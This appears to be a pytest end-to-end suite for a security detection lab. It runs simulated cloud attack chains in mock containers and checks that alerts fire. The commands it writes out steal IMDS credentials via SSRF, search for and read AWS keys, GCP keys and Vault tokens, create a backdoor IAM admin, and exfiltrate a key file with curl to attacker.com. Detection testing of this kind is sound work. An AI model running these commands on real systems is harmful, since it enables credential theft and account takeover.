"""
E2E tests for Category 2: Cloud Service Account scenarios.

Tests detection of IMDS credential theft, IAM misconfigurations,
cross-account abuse, and service account exfiltration.

Each test class follows the multi-phase attack chain defined in
the corresponding scenario JSON file under scenarios/category-2-cloud/.
"""

import json
import time
import pytest
from helpers.docker_utils import DockerTestUtils


# Container and agent configuration for Category 2
CLOUD_CONTAINER = "cloud-workload"
CLOUD_AGENT = "cloud-workload-001"
IMDS_CONTAINER = "mock-imds"
VULN_APP_CONTAINER = "vulnerable-app"
VAULT_CONTAINER = "vault"


def _skip_if_containers_down(*containers):
    """Skip test if any required container is not running."""
    for name in containers:
        if not DockerTestUtils.container_running(name):
            pytest.skip(f"{name} container not running")


@pytest.mark.e2e
@pytest.mark.category_2
class TestS201IMDSCredentialTheft:
    """S2-01: IMDS credential theft via SSRF.

    Simulates the Capital One breach pattern:
    1. Discover IMDS metadata service
    2. Enumerate metadata fields
    3. Discover IAM roles
    4. Steal IAM credentials
    """

    SCENARIO_ID = "S2-01"
    EXPECTED_RULES = ["100650", "100651"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CLOUD_CONTAINER, IMDS_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"
        assert "phases" in scenario, "Scenario missing phases"

    def test_phase1_imds_discovery(self, mock_imds_client):
        """Phase 1: Discover IMDS metadata service."""
        root = mock_imds_client.get_metadata_root()
        assert root is not None, "IMDS metadata root returned None"
        assert "iam" in root.lower(), "IMDS root missing 'iam' entry"
        assert "instance-id" in root.lower(), "IMDS root missing 'instance-id'"

    def test_phase2_metadata_enumeration(self, mock_imds_client):
        """Phase 2: Enumerate instance metadata fields."""
        instance_id = mock_imds_client.get_instance_id()
        assert instance_id is not None, "Could not get instance-id"
        assert instance_id.startswith("i-"), f"Invalid instance ID format: {instance_id}"

        response = mock_imds_client.get("/latest/meta-data/instance-type")
        assert response.status_code == 200
        assert response.text == "t3.medium", f"Unexpected instance type: {response.text}"

    def test_phase3_iam_role_enumeration(self, mock_imds_client):
        """Phase 3: Discover IAM role name - reconnaissance step."""
        role_name = mock_imds_client.get_iam_role()
        assert role_name is not None, "Could not discover IAM role"
        assert "demo-ec2-instance-role" in role_name, \
            f"Unexpected role name: {role_name}"

    def test_phase4_credential_theft(self, mock_imds_client):
        """Phase 4: Steal IAM credentials - the critical attack."""
        role_name = mock_imds_client.get_iam_role()
        assert role_name is not None, "No IAM role to steal credentials from"

        creds = mock_imds_client.get_iam_credentials(role_name)
        assert creds is not None, "Failed to retrieve IAM credentials"
        assert "AccessKeyId" in creds, "Missing AccessKeyId in stolen credentials"
        assert creds["AccessKeyId"].startswith("ASIA"), \
            f"AccessKeyId has unexpected prefix: {creds['AccessKeyId']}"
        assert "SecretAccessKey" in creds, "Missing SecretAccessKey"
        assert "Token" in creds, "Missing session Token"
        assert "Expiration" in creds, "Missing Expiration"

    def test_ssrf_via_vulnerable_app(self, vulnerable_app_client):
        """Cross-cutting: SSRF through vulnerable app to IMDS (Capital One vector)."""
        _skip_if_containers_down(VULN_APP_CONTAINER)
        ssrf_url = "http://mock-imds:1338/latest/meta-data/iam/security-credentials/demo-ec2-instance-role"
        try:
            response = vulnerable_app_client.get(f"/fetch?url={ssrf_url}")
            assert response.status_code == 200, f"SSRF request failed: {response.status_code}"
            data = response.json()
            # The vulnerable app wraps the response
            resp_data = data.get("response", data)
            assert "AccessKeyId" in str(resp_data), \
                "SSRF to IMDS did not return credentials"
        except Exception as e:
            pytest.skip(f"Vulnerable app SSRF test failed: {e}")

    def test_attack_from_cloud_workload(self):
        """Execute IMDS credential theft from cloud-workload container."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "curl -s http://mock-imds:1338/latest/meta-data/iam/security-credentials/demo-ec2-instance-role",
            timeout=15
        )
        assert exit_code == 0, f"IMDS curl failed: {stderr}"
        assert "AccessKeyId" in stdout, "IMDS response missing AccessKeyId"
        assert "ASIA" in stdout, "AccessKeyId missing ASIA prefix"

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh alerts fire after attack execution."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        if not scenario:
            pytest.skip(f"Scenario {self.SCENARIO_ID} not found")

        # Trigger the attack chain to generate logs
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "curl -s http://mock-imds:1338/latest/meta-data/iam/security-credentials/",
            timeout=10
        )
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "curl -s http://mock-imds:1338/latest/meta-data/iam/security-credentials/demo-ec2-instance-role",
            timeout=10
        )

        result = alert_validator.validate_scenario_alerts(
            scenario, timeout=60, agent_name=CLOUD_AGENT
        )

        if result["expected_count"] == 0:
            pytest.skip("No expected alerts defined for scenario")

        assert result["found_count"] > 0, \
            f"No alerts for {self.SCENARIO_ID}. Missing: {result['missing_rules']}"


@pytest.mark.e2e
@pytest.mark.category_2
class TestS202OverPermissionedIAM:
    """S2-02: Over-permissioned IAM role exploitation.

    Attack chain:
    1. Acquire IMDS credentials
    2. Enumerate IAM permissions (discover AdministratorAccess)
    3. Simulate privilege escalation (create backdoor user)
    """

    SCENARIO_ID = "S2-02"
    EXPECTED_RULES = ["100700", "100701", "100702"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CLOUD_CONTAINER, IMDS_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"

    def test_phase1_credential_acquisition(self, mock_imds_client):
        """Phase 1: Acquire IAM credentials via IMDS."""
        role_name = mock_imds_client.get_iam_role()
        creds = mock_imds_client.get_iam_credentials(role_name)
        assert creds is not None, "Failed to acquire initial credentials"
        assert "AccessKeyId" in creds

    def test_phase2_permission_enumeration(self):
        """Phase 2: Enumerate IAM permissions, discover AdminAccess."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "curl -s http://mock-imds:1338/latest/meta-data/iam/info",
            timeout=15
        )
        assert exit_code == 0, f"IAM info request failed: {stderr}"
        assert "AdministratorAccess" in stdout, \
            "Expected AdministratorAccess policy in IAM info"
        # Parse and validate the full policy structure
        try:
            info = json.loads(stdout)
            policies = info.get("AttachedPolicies", [])
            policy_names = [p.get("PolicyName") for p in policies]
            assert "AdministratorAccess" in policy_names, \
                f"AdministratorAccess not in attached policies: {policy_names}"
        except json.JSONDecodeError:
            pass  # Non-JSON response is acceptable for simulation

    def test_phase3_privilege_escalation_simulation(self):
        """Phase 3: Simulate IAM privilege escalation via syslog."""
        # Simulate aws iam create-user (generates detectable log)
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: IAM privilege escalation - '
            'aws iam create-user --user-name backdoor-admin"',
            timeout=10
        )
        assert exit_code == 0, f"Logger command failed: {stderr}"

        # Simulate attach-user-policy
        exit_code, _, _ = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: IAM policy attachment - '
            'aws iam attach-user-policy --user-name backdoor-admin '
            '--policy-arn arn:aws:iam::aws:policy/AdministratorAccess"',
            timeout=10
        )
        assert exit_code == 0

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh alerts fire."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        if not scenario:
            pytest.skip(f"Scenario {self.SCENARIO_ID} not found")

        # Trigger attack
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "curl -s http://mock-imds:1338/latest/meta-data/iam/info",
            timeout=10
        )
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: IAM privilege escalation - '
            'aws iam create-user --user-name backdoor-admin"',
            timeout=10
        )

        result = alert_validator.validate_scenario_alerts(
            scenario, timeout=60, agent_name=CLOUD_AGENT
        )
        if result["expected_count"] == 0:
            pytest.skip("No expected alerts defined")

        assert result["found_count"] > 0, \
            f"No alerts for {self.SCENARIO_ID}. Missing: {result['missing_rules']}"


@pytest.mark.e2e
@pytest.mark.category_2
class TestS203CrossAccountRole:
    """S2-03: Cross-account role assumption abuse.

    Attack chain:
    1. Obtain initial credentials via IMDS
    2. Discover cross-account trust relationships
    3. Assume role in target account
    4. Access target account resources (lateral movement)
    """

    SCENARIO_ID = "S2-03"
    EXPECTED_RULES = ["100703", "100704", "100705"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CLOUD_CONTAINER, IMDS_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"

    def test_phase1_initial_access(self, mock_imds_client):
        """Phase 1: Obtain source account credentials."""
        role_name = mock_imds_client.get_iam_role()
        creds = mock_imds_client.get_iam_credentials(role_name)
        assert creds is not None and "AccessKeyId" in creds

    def test_phase2_trust_discovery(self):
        """Phase 2: Discover cross-account trust relationships."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Cross-account discovery - '
            'aws iam list-roles --query Roles[?AssumeRolePolicyDocument]"',
            timeout=10
        )
        assert exit_code == 0, f"Trust discovery simulation failed: {stderr}"

    def test_phase3_role_assumption(self):
        """Phase 3: Assume role in target account."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Cross-account role assumption - '
            'aws sts assume-role --role-arn arn:aws:iam::987654321098:role/CrossAccountAdminRole '
            '--role-session-name attacker-session"',
            timeout=10
        )
        assert exit_code == 0, f"Role assumption simulation failed: {stderr}"

    def test_phase4_lateral_movement(self):
        """Phase 4: Access target account resources."""
        # Simulate S3 access in target account
        exit_code, _, _ = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Lateral movement - '
            'aws s3 ls s3://confidential-data --profile target-account"',
            timeout=10
        )
        assert exit_code == 0

        # Simulate EC2 enumeration
        exit_code, _, _ = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Lateral movement - '
            'aws ec2 describe-instances --profile target-account"',
            timeout=10
        )
        assert exit_code == 0

    def test_sts_caller_identity_check(self, mock_imds_client):
        """Verify STS GetCallerIdentity with stolen credentials."""
        response = mock_imds_client.get("/sts/get-caller-identity")
        assert response.status_code == 200
        data = response.json()
        assert "Account" in data, "STS response missing Account"
        assert "Arn" in data, "STS response missing Arn"
        assert "AdministratorAccess" in str(data), \
            "STS response should show admin privileges"

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh alerts fire."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        if not scenario:
            pytest.skip(f"Scenario {self.SCENARIO_ID} not found")

        # Trigger full attack chain
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Cross-account role assumption - '
            'aws sts assume-role --role-arn arn:aws:iam::987654321098:role/CrossAccountAdminRole"',
            timeout=10
        )

        result = alert_validator.validate_scenario_alerts(
            scenario, timeout=60, agent_name=CLOUD_AGENT
        )
        if result["expected_count"] == 0:
            pytest.skip("No expected alerts defined")

        assert result["found_count"] > 0, \
            f"No alerts for {self.SCENARIO_ID}. Missing: {result['missing_rules']}"


@pytest.mark.e2e
@pytest.mark.category_2
class TestS204ServiceAccountExfil:
    """S2-04: Service account key exfiltration.

    Attack chain:
    1. Search for credential files on the system
    2. Read AWS credentials
    3. Extract GCP service account key
    4. Simulate exfiltration via HTTP
    """

    SCENARIO_ID = "S2-04"
    EXPECTED_RULES = ["100706", "100707", "100708"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CLOUD_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"

    def test_phase1_credential_file_search(self):
        """Phase 1: Search filesystem for credential files."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "find / -maxdepth 4 \\( -name 'credentials' -o -name '*.pem' "
            "-o -name 'service-account*.json' -o -name '.env' \\) "
            "-type f 2>/dev/null | head -10 || true",
            timeout=30
        )
        assert exit_code in [0, 1], f"Credential search failed: {stderr}"

    def test_phase2_aws_credential_search(self):
        """Phase 2: Attempt to read AWS credential files."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat /root/.aws/credentials 2>/dev/null || "
            "cat /home/*/.aws/credentials 2>/dev/null || "
            "echo 'NO_AWS_CREDS_FOUND'",
            timeout=10
        )
        assert exit_code == 0
        # Log the attempt for Wazuh detection
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Credential file access - '
            'reading /root/.aws/credentials"',
            timeout=10
        )

    def test_phase3_service_account_key_search(self):
        """Phase 3: Search for GCP/cloud service account keys."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "find / -maxdepth 4 -name '*.json' -exec grep -l 'private_key' {} \\; "
            "2>/dev/null | head -5 || true",
            timeout=30
        )
        assert exit_code in [0, 1], f"Service account search failed: {stderr}"

        # Log the discovery attempt
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Service account key search - '
            'grep -r private_key *.json"',
            timeout=10
        )

    def test_phase4_exfiltration_simulation(self):
        """Phase 4: Simulate credential exfiltration."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Credential exfiltration attempt - '
            'curl -X POST https://attacker.com/exfil -d @/app/service-account.json"',
            timeout=10
        )
        assert exit_code == 0, f"Exfiltration simulation failed: {stderr}"

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh alerts fire."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        if not scenario:
            pytest.skip(f"Scenario {self.SCENARIO_ID} not found")

        # Trigger credential search patterns
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Service account key search - '
            'find / -name credentials -o -name *.pem"',
            timeout=10
        )

        result = alert_validator.validate_scenario_alerts(
            scenario, timeout=60, agent_name=CLOUD_AGENT
        )
        if result["expected_count"] == 0:
            pytest.skip("No expected alerts defined")

        assert result["found_count"] > 0, \
            f"No alerts for {self.SCENARIO_ID}. Missing: {result['missing_rules']}"


@pytest.mark.e2e
@pytest.mark.category_2
class TestS205VaultTokenTheft:
    """S2-05: HashiCorp Vault token theft.

    Attack chain:
    1. Check for cached Vault token file (~/.vault-token)
    2. Enumerate Vault-related environment variables
    3. Validate stolen token against Vault API
    """

    SCENARIO_ID = "S2-05"
    EXPECTED_RULES = ["100606"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CLOUD_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"
        assert "phases" in scenario, "Scenario missing phases"

    def test_phase1_vault_token_file_discovery(self):
        """Phase 1: Check for cached Vault token file."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat ~/.vault-token 2>/dev/null || echo 'NO_VAULT_TOKEN'",
            timeout=10
        )
        assert exit_code == 0, f"Vault token file check failed: {stderr}"

        # Log the access attempt for Wazuh detection
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Vault token file access - '
            'reading ~/.vault-token"',
            timeout=10
        )

    def test_phase2_vault_env_enumeration(self):
        """Phase 2: Enumerate Vault-related environment variables."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "env | grep VAULT || echo 'NO_VAULT_ENV'",
            timeout=10
        )
        assert exit_code == 0, f"Vault env check failed: {stderr}"

        # Log environment enumeration
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Vault environment enumeration - '
            'env | grep VAULT"',
            timeout=10
        )

    def test_phase3_vault_token_validation(self):
        """Phase 3: Validate stolen token against Vault API."""
        # Attempt to read token and validate
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "TOKEN=$(cat ~/.vault-token 2>/dev/null || echo 'none'); "
            "curl -sf -H \"X-Vault-Token: $TOKEN\" "
            "http://vault:8200/v1/auth/token/lookup-self 2>/dev/null "
            "|| echo 'VAULT_AUTH_FAILED'",
            timeout=15
        )
        assert exit_code == 0

        # Log the token validation attempt
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Vault token validation - '
            'curl http://vault:8200/v1/auth/token/lookup-self with stolen token"',
            timeout=10
        )

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh alerts fire."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        if not scenario:
            pytest.skip(f"Scenario {self.SCENARIO_ID} not found")

        # Trigger Vault token access pattern
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat ~/.vault-token 2>/dev/null || true",
            timeout=10
        )
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Vault token file access - '
            'reading ~/.vault-token"',
            timeout=10
        )

        result = alert_validator.validate_scenario_alerts(
            scenario, timeout=60, agent_name=CLOUD_AGENT
        )
        if result["expected_count"] == 0:
            pytest.skip("No expected alerts defined")

        assert result["found_count"] > 0, \
            f"No alerts for {self.SCENARIO_ID}. Missing: {result['missing_rules']}"
